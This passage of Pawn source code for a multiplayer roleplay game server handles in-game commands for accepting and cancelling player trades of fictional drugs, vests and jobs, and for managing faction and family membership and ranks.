		if(!IsPlayerNearPlayer(playerid, seller, 2)) return SendClientMessage(playerid, COLOR_GRAD2, "You are too far away from that player.");
	    if(Player[seller][pCocaine] < cocaineAmount[seller][playerid])
		{
		    cocaineSeller[playerid] = -1;
			cocainePrice[seller][playerid] = 0;
			cocaineAmount[seller][playerid] = 0;
			SendClientMessage(playerid, COLOR_GRAD2, "That player doesn't have that much cocaine on them.");
			SendClientMessage(seller, COLOR_GRAD2, "The trade has been cancelled as you don't have the cocaine you offered.");
			return 1;
		}
		if(cocainePrice[seller][playerid] > Player[playerid][pMoney]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much money on you.");
		GiveZamoraMoney(playerid, -cocainePrice[seller][playerid]);
		GiveZamoraMoney(seller, cocainePrice[seller][playerid]);
		Player[seller][pCocaine] -= cocaineAmount[seller][playerid];
		Player[playerid][pCocaine] += cocaineAmount[seller][playerid];
		Player[seller][pJobSkill][JOB_DDEALER] ++;
		format(string, sizeof(string), "* %s takes out a pack of cocaine, hands it to %s and takes $%d from him", GetName(seller), GetName(playerid), cocainePrice[seller][playerid]);
		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		format(string, sizeof(string), " You have bought %d grams of cocaine $%d from %s.", cocaineAmount[seller][playerid], cocainePrice[seller][playerid], GetName(seller));
		SendClientMessage(playerid, COLOR_YELLOW, string);
		format(string, sizeof(string), " %s has bought %d grams of cocaine for $%d from you.", GetName(playerid), cocaineAmount[seller][playerid], cocainePrice[seller][playerid]);
		SendClientMessage(seller, COLOR_YELLOW, string);
		cocaineSeller[playerid] = -1;
		cocainePrice[seller][playerid] = 0;
		cocaineAmount[seller][playerid] = 0;
	}
	else if(!strcmp(var, "ticket", true))
	{
		new user = TicketBy[playerid];
		if(user == -1) return SendClientMessage(playerid, COLOR_GRAD2, "Nobody has written you a ticket.");
	    new amount = TicketPrice[user][playerid];
	    if(!IsPlayerNearPlayer(playerid, user, 2)) return SendClientMessage(playerid, COLOR_GRAD2, "You are too far away from that player.");
		if(Player[playerid][pMoney] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much money on you.");
		GiveZamoraMoney(playerid, -amount);
		GiveZamoraMoney(user, amount);
		format(string, sizeof(string), "* %s takes the ticket from %s and gives him some money.", GetName(playerid), GetName(user));
		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		format(string, sizeof(string), " You have paid $%d to %s for the ticket.", amount, GetName(user));
		SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
		format(string, sizeof(string), " %s has paid $%d to you for the ticket.", GetName(playerid), amount);
		SendClientMessage(user, COLOR_LIGHTBLUE, string);
		TicketBy[playerid] = -1;
		TicketPrice[user][playerid] = 0;
	}
	else if(!strcmp(var, "vest", true))
	{
	    new user = VestBy[playerid], Float:A;
        if(user == -1) return SendClientMessage(playerid, COLOR_GRAD2, "Nobody has offered you a vest.");
        if(!IsPlayerNearPlayer(playerid, user, 2)) return SendClientMessage(playerid, COLOR_GRAD2, "You are too far away from that player.");
        new price = VestPrice[user][playerid];
        if(Player[playerid][pMoney] < price) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much money on you.");
        if(A > 50)
		{
			SendClientMessage(playerid, COLOR_GRAD2, "Your armor is already over 50.");
			SendClientMessage(user, COLOR_GRAD2, "Player's vest is already over 50, your offer has been cancelled.");
			VestPrice[user][playerid] = 0;
			VestBy[playerid] = -1;
			return 1;
		}
		GetPlayerArmour(playerid, A);
		GiveZamoraMoney(playerid, -price);
		GiveZamoraMoney(user, price);
		SetPlayerArmour(playerid, 50);
		format(string, sizeof(string), " You have paid $%d to %s for the vest.", price, GetName(user));
		SendClientMessage(playerid, COLOR_YELLOW, string);
		format(string, sizeof(string), " %s has paid $%d to you for the vest.", GetName(playerid), price);
		SendClientMessage(user, COLOR_YELLOW, string);
	    VestPrice[user][playerid] = 0;
		VestBy[playerid] = -1;
	}
	else if(!strcmp(var, "live", true))
	{
		new user = LiveBy[playerid];
		if(user == -1) return SendClientMessage(playerid, COLOR_GRAD2, "Nobody has offered you a live news conference.");
		LiveBy[playerid] = -1;
		LiveRequest[user] = 0;
		Live[playerid] = 1;
		Live[user] = 1;
		SendClientMessage(playerid, COLOR_LIGHTBLUE, "You are now on air, you can speak on live news using your normal chat.");
		SendClientMessage(user, COLOR_LIGHTBLUE, "You are now on air, you can speak on live news using your normal chat. (/live to end the conference)");
	}
	else if(!strcmp(var, "job", true))
	{
        if(GettingJob[playerid] > 0)
		{
            if(GettingJob[playerid] == 1)
			{
     	   	    if(!Player[playerid][pJob]) Player[playerid][pJob] = JOB_MECHANIC;
     	   	    else if(Player[playerid][pVIP] >= 2) Player[playerid][pVIPJob] = JOB_MECHANIC;
     	   	    SendClientMessage(playerid, COLOR_YELLOW, "* You have joined the {FF6347}Mechanic {FFFF00}job, type /help to view your job commands.");
            }
            else if(GettingJob[playerid] == 2)
			{
     	   	    if(!Player[playerid][pJob]) Player[playerid][pJob] = JOB_LAWYER;
           	    else if(Player[playerid][pVIP] >= 2) Player[playerid][pVIPJob] = JOB_LAWYER;
         	    SendClientMessage(playerid, COLOR_YELLOW, "* You have joined the {FF6347}Lawyer {FFFF00}job, type /help to view your job commands.");
            }
            else if(GettingJob[playerid] == 3)
			{
     	   	    if(!Player[playerid][pJob]) Player[playerid][pJob] = JOB_TRUCKER;
          	    else if(Player[playerid][pVIP] >= 2) Player[playerid][pVIPJob] = JOB_TRUCKER;
	            SendClientMessage(playerid, COLOR_YELLOW, "* You have joined the {FF6347}Trucker {FFFF00}job, type /help to view your job commands.");
            }
            else if(GettingJob[playerid] == 4)
			{
     	   	    if(!Player[playerid][pJob]) Player[playerid][pJob] = JOB_WSMUGGLER;
        	    else if(Player[playerid][pVIP] >= 2) Player[playerid][pVIPJob] = JOB_WSMUGGLER;
         	    SendClientMessage(playerid, COLOR_YELLOW, "* You have joined the {FF6347}Weapons Smuggler {FFFF00}job, type /help to view your job commands.");
            }
            else if(GettingJob[playerid] == 5)
			{
     	   	    if(!Player[playerid][pJob]) Player[playerid][pJob] = JOB_WDEALER;
        	    else if(Player[playerid][pVIP] >= 2) Player[playerid][pVIPJob] = JOB_WDEALER;
         	    SendClientMessage(playerid, COLOR_YELLOW, "* You have joined the {FF6347}Weapons Dealer {FFFF00}job, type /help to view your job commands.");
            }
            else if(GettingJob[playerid] == 6)
			{
     	   	    if(!Player[playerid][pJob]) Player[playerid][pJob] = JOB_DDEALER;
         	    else if(Player[playerid][pVIP] >= 2) Player[playerid][pVIPJob] = JOB_DDEALER;
         	    SendClientMessage(playerid, COLOR_YELLOW, "* You have joined the {FF6347}Drugs Dealer {FFFF00}job, type /help to view your job commands.");
            }
            else if(GettingJob[playerid] == 7)
			{
     	   	    if(!Player[playerid][pJob]) Player[playerid][pJob] = JOB_DSMUGGLER;
         	    else if(Player[playerid][pVIP] >= 2) Player[playerid][pVIPJob] = JOB_DSMUGGLER;
         	    SendClientMessage(playerid, COLOR_YELLOW, "* You have joined the {FF6347}Drugs Smuggler {FFFF00}job, type /help to view your job commands.");
            }
            else if(GettingJob[playerid] == 8)
			{
     	   	    if(!Player[playerid][pJob]) Player[playerid][pJob] = JOB_BODYGUARD;
         	    else if(Player[playerid][pVIP] >= 2) Player[playerid][pVIPJob] = JOB_BODYGUARD;
                SendClientMessage(playerid, COLOR_YELLOW, "* You have joined the {FF6347}Bodyguard {FFFF00}job, type /help to view your job commands.");
            }
        }
    }
	return 1;
}


IRP:cancel(playerid, var[])
{
	new string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(sscanf(var, "s[128]", var))
	{
		SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /cancel [option]");
		SendClientMessage(playerid, COLOR_GRAD2, "** [OPTIONS]: faction | materials | weapon | family | free | defend | weed | cocaine");
		SendClientMessage(playerid, COLOR_GRAD2, "** [OPTIONS]: ticket | vest | live");
		return 1;
	}
	if(!strcmp(var, "faction", true))
	{
	    if(!Invited[playerid]) return SendClientMessage(playerid, COLOR_GRAD2, "You haven't been invited to a faction.");
	    {
			Player[playerid][pFac] = 0;
			Player[playerid][pFacRank] = 0;
			Player[playerid][pFacLeader] = 0;
			Player[playerid][pFacDiv] = 0;
			Player[playerid][pFacDivLeader] = 0;
			Invited[playerid] = 0;
			Faction[playerid] = 0;
			format(string, sizeof(string), " You have cancelled %s's faction invitation.", GetName(Inviter[playerid]));
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			format(string, sizeof(string), " %s has cancelled your faction invitation.", GetName(playerid));
			SendClientMessage(Inviter[playerid], COLOR_LIGHTBLUE, string);
	    }
	}
	else if(!strcmp(var, "family", true))
	{
	    if(!fInvited[playerid]) return SendClientMessage(playerid, COLOR_GRAD2, "You haven't been invited to a family.");
	    {
			Player[playerid][pFam] = 0;
			Player[playerid][pFamRank] = 0;
			fInvited[playerid] = 0;
			Family[playerid] = 0;
			format(string, sizeof(string), " You have cancelled %s's family invitation.", GetName(fInviter[playerid]));
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			format(string, sizeof(string), " %s has cancelled your family invitation.", GetName(playerid));
			SendClientMessage(fInviter[playerid], COLOR_LIGHTBLUE, string);
	    }
	}
	else if(!strcmp(var, "materials", true))
	{
	    if(BeenOfferedMaterials[playerid])
	    {
			new user = BuyMaterialsFrom[playerid];
			if(!IsPlayerNearPlayer(playerid, user, 2)) return SendClientMessage(playerid, COLOR_GRAD2, "You are too far away from that player.");
			format(string, sizeof(string), " You have cancelled %d's materials offer.", GetName(user));
			SendClientMessage(playerid, COLOR_YELLOW, string);
			format(string, sizeof(string), " %s has cancelled your materials offer.", GetName(playerid));
			SendClientMessage(user, COLOR_YELLOW, string);
			SellMaterialsTo[user] = -1;
			BuyMaterialsFrom[playerid] = -1;
			BuyMaterialsAmount[playerid] = 0;
			BuyMaterialsPrice[playerid] = 0;
			BeenOfferedMaterials[playerid] = 0;
		}
		else
		{
		    SendClientMessage(playerid, COLOR_GRAD2, "Nobody has offered to sell you materials.");
		    return 1;
		}
	}
	else if(!strcmp(var, "weapon", true))
	{
		if(BeenOfferedWeapon[playerid])
	    {
			new user = BuyWeaponFrom[playerid];
			if(!IsPlayerNearPlayer(playerid, user, 2)) return SendClientMessage(playerid, COLOR_GRAD2, "You are too far away from that player.");
			format(string, sizeof(string), " You have cancelled %s's weapon offer.", GetName(user));
			SendClientMessage(playerid, COLOR_YELLOW, string);
			format(string, sizeof(string), " %s has cancelled your weapon offer.", GetName(playerid));
			SendClientMessage(user, COLOR_YELLOW, string);
			SellWeaponTo[user] = -1;
			BuyWeaponFrom[playerid] = -1;
			BuyWeaponPrice[playerid] = 0;
			BeenOfferedWeapon[playerid] = 0;
		}
		else
		{
		    SendClientMessage(playerid, COLOR_GRAD2, "Nobody has offered to sell you a weapon.");
		    return 1;
		}
	}
	else if(!strcmp(var, "free", true))
	{
		if(!Player[playerid][pJail]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not prisoned.");
		if(FreeBy[playerid] == -1) return SendClientMessage(playerid, COLOR_GRAD2, "Nobody has offered to free you.");
		format(string, sizeof(string), " You have cancelled %s's prison sentence reducing offer.", GetName(FreeBy[playerid]));
		SendClientMessage(playerid, COLOR_YELLOW, string);
		format(string, sizeof(string), " %s has cancelled your prison sentence reducing offer.", GetName(playerid));
	    SendClientMessage(FreeBy[playerid], COLOR_YELLOW, string);
		FreeTime[playerid] = 0;
		FreePrice[FreeBy[playerid]][playerid] = 0;
		FreeBy[playerid] = -1;
	}
	else if(!strcmp(var, "defend", true))
	{
		if(!Player[playerid][pWanted]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not wanted.");
		if(DefendBy[playerid] == -1) return SendClientMessage(playerid, COLOR_GRAD2, "Nobody has offered to defend you.");
		format(string, sizeof(string), " You have cancelled %s's defend offer.", GetName(DefendBy[playerid]));
		SendClientMessage(playerid, COLOR_YELLOW, string);
		format(string, sizeof(string), " %s has cancelled your defend request.", GetName(playerid));
	    SendClientMessage(DefendBy[playerid], COLOR_YELLOW, string);
		DefendPrice[DefendBy[playerid]][playerid] = 0;
		DefendBy[playerid] = -1;
	}
	else if(!strcmp(var, "weed", true))
	{
		new seller = WeedSeller[playerid];
		if(!Logged(playerid)) return NoLogin(playerid);
		if(seller == -1) return SendClientMessage(playerid, COLOR_GRAD2, "Nobody has offered to sell you weed.");
		format(string, sizeof(string), " You have cancelled %s's weed offer.", GetName(seller));
		SendClientMessage(playerid, COLOR_YELLOW, string);
		format(string, sizeof(string), " %s has cancelled your weed offer.", GetName(playerid));
		SendClientMessage(seller, COLOR_YELLOW, string);
		WeedSeller[playerid] = -1;
		WeedPrice[seller][playerid] = 0;
		WeedAmount[seller][playerid] = 0;
	}
    else if(!strcmp(var, "cocaine", true))
	{
		new seller = cocaineSeller[playerid];
		if(!Logged(playerid)) return NoLogin(playerid);
		if(seller == -1) return SendClientMessage(playerid, COLOR_GRAD2, "Nobody has offered to sell you cocaine.");
		format(string, sizeof(string), " You have cancelled %s's cocaine offer.", GetName(seller));
		SendClientMessage(playerid, COLOR_YELLOW, string);
		format(string, sizeof(string), " %s has cancelled your cocaine offer.", GetName(playerid));
		SendClientMessage(seller, COLOR_YELLOW, string);
		cocaineSeller[playerid] = -1;
		cocainePrice[seller][playerid] = 0;
		cocaineAmount[seller][playerid] = 0;
	}
	else if(!strcmp(var, "contract", true))
	{
		if(IsAHitman(playerid))
		{
    	   	if(!Logged(playerid)) return NoLogin(playerid);
			if(Hitman[playerid] == -1) return SendClientMessage(playerid, COLOR_GRAD2, "You are not assigned to any contracts.");
			format(string, sizeof(string), "HitmanWarn: %s has cancelled their contract assignment on %s's head.", GetName(playerid), GetName(Hitman[playerid]));
			SendHitmanMessage(COLOR_YELLOW, string);
			Hitman[playerid] = -1;
		}
	}
	else if(!strcmp(var, "vest", true))
	{
	    new user = VestBy[playerid];
	    if(!Logged(playerid)) return NoLogin(playerid);
        if(user == -1) return SendClientMessage(playerid, COLOR_GRAD2, "Nobody has offered you a vest.");
        if(!IsPlayerNearPlayer(playerid, user, 2)) return SendClientMessage(playerid, COLOR_GRAD2, "You are too far away from that player.");
		format(string, sizeof(string), " You have cancelled %s's vest offer.", GetName(user));
		SendClientMessage(playerid, COLOR_YELLOW, string);
		format(string, sizeof(string), " %s has cancelled your vest offer.", GetName(playerid));
		SendClientMessage(user, COLOR_YELLOW, string);
	    VestPrice[user][playerid] = 0;
		VestBy[user] = -1;
	}
	else if(!strcmp(var, "live", true))
	{
		new user = LiveBy[playerid];
		if(user == -1) return SendClientMessage(playerid, COLOR_GRAD2, "Nobody has offered you a live news conference.");
		LiveBy[playerid] = -1;
		LiveRequest[user] = 0;
		Live[playerid] = 0;
		Live[user] = 0;
		format(string, sizeof(string), " You have canceled %s's live news conference.", GetName(user));
		SendClientMessage(playerid, COLOR_LIME, string);
		format(string, sizeof(string), " %s has canceled your live news conference.", GetName(playerid));
		SendClientMessage(user, COLOR_LIME, string);
	}
	return 1;
}

IRP:uninvite(playerid, var[])
{
	new user, string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(!Player[playerid][pFacLeader]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a faction leader.");
	if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /uninvite [playerid]");
	if(!Logged(user)) return SendClientMessage(playerid, COLOR_GRAD2, "I can't find this player.");
	if(Player[user][pFac] != Player[playerid][pFac]) return SendClientMessage(playerid, COLOR_GRAD2, "Player is not in your faction.");
	if(playerid == user) return SendClientMessage(playerid, COLOR_GRAD2, "You can't uninvite yourself.");
	Player[user][pFac] = 0;
	Player[user][pFacRank] = 0;
	Player[user][pFacLeader] = 0;
	Player[user][pFacDuty] = 0;
	SetPlayerColor(user, TRANSPARENT_WHITE);
	format(string, sizeof(string), " You have kicked %s out of the {01A9DB}%s {33CCFF}faction.", GetName(user), RPFNEx(playerid));
	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	format(string, sizeof(string), " %s has kicked you out of the {01A9DB}%s {33CCFF}faction, you are now a civilian.", GetName(playerid), RPFNEx(playerid));
	SendClientMessage(user, COLOR_LIGHTBLUE, string);
	return 1;
}

IRP:finvite(playerid, var[])
{
	new user, string[128], idx = Player[playerid][pFam];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pFamRank] < 5) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a family leader.");
	if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /finvite [playerid]");
	if(!Logged(user)) return NoLoginB(playerid);
	if(Player[user][pFam]) return SendClientMessage(playerid, COLOR_GRAD2, "Player is already in a family.");
	if(playerid == user) return SendClientMessage(playerid, COLOR_GRAD2, "You can't invite yourself.");
	if(FamInfo[idx][fLevel] == 1)
	{
	   if(FamInfo[idx][fMembers] == 10) return SendClientMessage(playerid, COLOR_GRAD2, "You can't invite anymore, You have to upgrade your family level.");
	}
	if(FamInfo[idx][fLevel] == 2)
	{
	   if(FamInfo[idx][fMembers] == 20) return SendClientMessage(playerid, COLOR_GRAD2, "You can't invite anymore, You have to upgrade your family level.");
	}
	if(FamInfo[idx][fLevel] == 3)
	{
	   if(FamInfo[idx][fMembers] == 30) return SendClientMessage(playerid, COLOR_GRAD2, "You can't invite anymore, You have to upgrade your family level.");
	}
	// Inviting
	fInvited[user] = 1;
	fInviter[user] = playerid;
	Family[user] = idx;
	format(string, sizeof(string), " You have invited %s to join the {01A9DB}%s {33CCFF}family.", GetName(user), FamInfo[idx][fName]);
	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	format(string, sizeof(string), " %s has invited you to join the {01A9DB}%s {33CCFF}family. (/accept family) (/cancel family)", GetName(playerid), FamInfo[idx][fName]);
	SendClientMessage(user, COLOR_LIGHTBLUE, string);
	return 1;
}

IRP:funinvite(playerid, var[])
{
	new user, string[128], idx = Player[playerid][pFam];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pFamRank] < 5) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a family leader.");
	if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /fuinvite [playerid]");
	if(!Logged(user)) return NoLoginB(playerid);
	if(Player[user][pFam] != Player[playerid][pFam]) return SendClientMessage(playerid, COLOR_GRAD2, "Player is not in your family.");
	if(playerid == user) return SendClientMessage(playerid, COLOR_GRAD2, "You can't unnvite yourself.");
	if(!strcmp(GetName(user), FamInfo[idx][fLeader], false)) return SendClientMessage(playerid, COLOR_GRAD2, "You cannot uninvite the family leader.");
	Player[user][pFam] = 0;
	Player[user][pFamRank] = 0;
	FamInfo[idx][fMembers] --;
	format(string, sizeof(string), " You have kicked %s out of the {01A9DB}%s {33CCFF}family.", GetName(user), FamInfo[idx][fName]);
	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	format(string, sizeof(string), " %s has kicked you out of the {01A9DB}%s {33CCFF}family.", GetName(playerid), FamInfo[idx][fName]);
	SendClientMessage(user, COLOR_LIGHTBLUE, string);

	return 1;
}
IRP:resfacveh(playerid, var[])
{
    if(!Player[playerid][pFacLeader]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a faction leader.");
	if(Player[playerid][pFac] == 1)
	{
		for(new i=0; i<26; i++)
		{
		    if(FacInfo[1][fCars][i] > 0 && IsVehicleOccupied(FacInfo[1][fCars][i]) == INVALID_VEHICLE_ID)
				SetVehicleToRespawn(FacInfo[1][fCars][i]);
		}}
	if(Player[playerid][pFac] == 5)
	{
		for(new i=0; i<8; i++)
		{
		    if(FacInfo[5][fCars][i] > 0 && IsVehicleOccupied(FacInfo[5][fCars][i]) == INVALID_VEHICLE_ID)
				SetVehicleToRespawn(FacInfo[5][fCars][i]);
		}}
	if(Player[playerid][pFac] == 6)
	{
		for(new i=0; i<15; i++)
		{
		    if(FacInfo[6][fCars][i] > 0 && IsVehicleOccupied(FacInfo[6][fCars][i]) == INVALID_VEHICLE_ID)
				SetVehicleToRespawn(FacInfo[6][fCars][i]);
		}}
	if(Player[playerid][pFac] == 4)
	{
		for(new i=0; i<8; i++)
		{
		    if(FacInfo[4][fCars][i] > 0 && IsVehicleOccupied(FacInfo[4][fCars][i]) == INVALID_VEHICLE_ID)
				SetVehicleToRespawn(FacInfo[4][fCars][i]);
		}}
	if(Player[playerid][pFac] == 7)
	{
		for(new i=0; i<15; i++)
		{
		    if(FacInfo[7][fCars][i] > 0 && IsVehicleOccupied(FacInfo[7][fCars][i]) == INVALID_VEHICLE_ID)
				SetVehicleToRespawn(FacInfo[7][fCars][i]);
		}

		SendClientMessage(playerid, COLOR_WHITE, "* All unoccupied vehicles for your faction have been respawned.");
	} else return SendClientMessage(playerid, COLOR_GRAD2, "You're not authorized to use this command (or your faction does not have any vehicles that can be dynamically respawned).");
	return 1;
}
IRP:invite(playerid, var[])
{
	new user, string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(!Player[playerid][pFacLeader]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a faction leader.");
	if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /invite [playerid]");
	if(!Logged(user)) return NoLoginB(playerid);
	if(Player[user][pFac]) return SendClientMessage(playerid, COLOR_GRAD2, "Player is already in a faction.");
	if(playerid == user) return SendClientMessage(playerid, COLOR_GRAD2, "You can't invite yourself.");
	// Inviting
	Invited[user] = 1;
	Inviter[user] = playerid;
	Faction[user] = Player[playerid][pFac];
	format(string, sizeof(string), " You have invited %s to join the {01A9DB}%s {33CCFF}faction.", GetName(user), RPFNEx(playerid));
	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	format(string, sizeof(string), " %s has invited you to join the {01A9DB}%s {33CCFF}faction. (/accept faction) (/cancel faction)", GetName(playerid), RPFNEx(playerid));
	SendClientMessage(user, COLOR_LIGHTBLUE, string);
	return 1;
}

IRP:rank(playerid, var[])
{
	new user, rank, string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(!Player[playerid][pFacLeader]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a faction leader.");
	if(sscanf(var, "ui", user, rank)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /rank [playerid] [rank]");
	if(playerid == user) return SendClientMessage(playerid, COLOR_GRAD2, "You can't change your rank.");
	if(!Logged(user)) return NoLoginB(playerid);
	if(Player[user][pFac] != Player[playerid][pFac]) return SendClientMessage(playerid, COLOR_GRAD2, "Player is not in your faction.");
	if(IsACop(playerid) || IsMedic(playerid))
	{
     	if(rank < 1 || rank > 16) return SendClientMessage(playerid, COLOR_GRAD2, "Ranks are between 1 and 16.");
     	if(Player[user][pFacRank] == rank) return SendClientMessage(playerid, COLOR_GRAD2, "Player already has that rank.");
     	if(Player[user][pFacRank] < rank)
    	{
	        Player[user][pFacRank] = rank;
	      	format(string, sizeof(string), "You have {01A9DB}promoted {33CCFF}%s to {01A9DB}%s (%d){33CCFF}.", GetName(user), RPFRN(user), rank);
	    	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	    	format(string, sizeof(string), "%s has {01A9DB}promoted {33CCFF}you to {01A9DB}%s (%d){33CCFF}.", GetName(playerid), RPFRN(user), rank);
	    	SendClientMessage(user, COLOR_LIGHTBLUE, string);
      	}
     	else if(Player[user][pFacRank] > rank)
    	{
    	    Player[user][pFacRank] = rank;
	    	format(string, sizeof(string), "You have {FF9900}demoted {33CCFF}%s to {FF9900}%s (%d){33CCFF}.", GetName(user), RPFRN(user), rank);
	    	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	    	format(string, sizeof(string), "%s has {FF9900}demoted {33CCFF}you to {FF9900}%s (%d){33CCFF}.", GetName(playerid), RPFRN(user), rank);
	    	SendClientMessage(user, COLOR_LIGHTBLUE, string);
     	}
    }
    if(IsDOC(playerid))
	{
     	if(rank < 1 || rank > 12) return SendClientMessage(playerid, COLOR_GRAD2, "Ranks are between 1 and 12.");
     	if(Player[user][pFacRank] == rank) return SendClientMessage(playerid, COLOR_GRAD2, "Player already has that rank.");
     	if(Player[user][pFacRank] < rank)
    	{
	        Player[user][pFacRank] = rank;
	      	format(string, sizeof(string), "You have {01A9DB}promoted {33CCFF}%s to {01A9DB}%s (%d){33CCFF}.", GetName(user), RPFRN(user), rank);
	    	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	    	format(string, sizeof(string), "%s has {01A9DB}promoted {33CCFF}you to {01A9DB}%s (%d){33CCFF}.", GetName(playerid), RPFRN(user), rank);
	    	SendClientMessage(user, COLOR_LIGHTBLUE, string);
      	}
     	else if(Player[user][pFacRank] > rank)
    	{
    	    Player[user][pFacRank] = rank;
	    	format(string, sizeof(string), "You have {FF9900}demoted {33CCFF}%s to {FF9900}%s (%d){33CCFF}.", GetName(user), RPFRN(user), rank);
	    	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	    	format(string, sizeof(string), "%s has {FF9900}demoted {33CCFF}you to {FF9900}%s (%d){33CCFF}.", GetName(playerid), RPFRN(user), rank);
	    	SendClientMessage(user, COLOR_LIGHTBLUE, string);
     	}
    }
    if(IsFBI(playerid))
	{
     	if(rank < 1 || rank > 11) return SendClientMessage(playerid, COLOR_GRAD2, "Ranks are between 1 and 11.");
     	if(Player[user][pFacRank] == rank) return SendClientMessage(playerid, COLOR_GRAD2, "Player already has that rank.");
     	if(Player[user][pFacRank] < rank)
    	{
	        Player[user][pFacRank] = rank;
	      	format(string, sizeof(string), "You have {01A9DB}promoted {33CCFF}%s to {01A9DB}%s (%d){33CCFF}.", GetName(user), RPFRN(user), rank);
	    	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	    	format(string, sizeof(string), "%s has {01A9DB}promoted {33CCFF}you to {01A9DB}%s (%d){33CCFF}.", GetName(playerid), RPFRN(user), rank);
	    	SendClientMessage(user, COLOR_LIGHTBLUE, string);
      	}
     	else if(Player[user][pFacRank] > rank)
    	{
    	    Player[user][pFacRank] = rank;
	    	format(string, sizeof(string), "You have {FF9900}demoted {33CCFF}%s to {FF9900}%s (%d){33CCFF}.", GetName(user), RPFRN(user), rank);
	    	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	    	format(string, sizeof(string), "%s has {FF9900}demoted {33CCFF}you to {FF9900}%s (%d){33CCFF}.", GetName(playerid), RPFRN(user), rank);
	    	SendClientMessage(user, COLOR_LIGHTBLUE, string);
     	}
    }
    if(IsAGov(playerid) || IsAHitman(playerid) || IsAReporter(playerid))
	{
     	if(rank < 1 || rank > 7) return SendClientMessage(playerid, COLOR_GRAD2, "Ranks are between 1 and 7.");
     	if(Player[user][pFacRank] == rank) return SendClientMessage(playerid, COLOR_GRAD2, "Player already has that rank.");
     	if(Player[user][pFacRank] < rank)
    	{
	        Player[user][pFacRank] = rank;
	      	format(string, sizeof(string), "You have {01A9DB}promoted {33CCFF}%s to {01A9DB}%s (%d){33CCFF}.", GetName(user), RPFRN(user), rank);
	    	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	    	format(string, sizeof(string), "%s has {01A9DB}promoted {33CCFF}you to {01A9DB}%s (%d){33CCFF}.", GetName(playerid), RPFRN(user), rank);
	    	SendClientMessage(user, COLOR_LIGHTBLUE, string);
      	}
     	else if(Player[user][pFacRank] > rank)
    	{
    	    Player[user][pFacRank] = rank;
	    	format(string, sizeof(string), "You have {FF9900}demoted {33CCFF}%s to {FF9900}%s (%d){33CCFF}.", GetName(user), RPFRN(user), rank);
	    	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	    	format(string, sizeof(string), "%s has {FF9900}demoted {33CCFF}you to {FF9900}%s (%d){33CCFF}.", GetName(playerid), RPFRN(user), rank);
	    	SendClientMessage(user, COLOR_LIGHTBLUE, string);
     	}
    }
	return 1;
}

IRP:dinvite(playerid, var[])
{
	new user, string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(!Player[playerid][pFacDivLeader]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a division leader.");
	if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /dinvite [playerid]");
	if(!Logged(user)) return NoLoginB(playerid);
	if(Player[user][pFac] != Player[playerid][pFac]) return SendClientMessage(playerid, COLOR_GRAD2, "Player is not in your faction.");
	if(Player[user][pFacDiv]) return SendClientMessage(playerid, COLOR_GRAD2, "Player is already in a division.");
	Player[user][pFacDiv] = Player[playerid][pFacDiv];
	Player[user][pFacDivLeader] = 0;
	format(string, sizeof(string), "You have assigned %s to the {01A9DB}%s {33CCFF}division.", GetName(user), RPFDN(user));
	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	format(string, sizeof(string), "%s has assigned you to the {01A9DB}%s {33CCFF}division.", GetName(playerid), RPFDN(user));
	SendClientMessage(user, COLOR_LIGHTBLUE, string);
	return 1;
}

IRP:duninvite(playerid, var[])
{
	new user, string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(!Player[playerid][pFacDivLeader]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a division leader.");
	if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /dinvite [playerid]");
	if(!Logged(user)) return NoLoginB(playerid);
	if(Player[user][pFac] != Player[playerid][pFac]) return SendClientMessage(playerid, COLOR_GRAD2, "Player is not in your faction.");
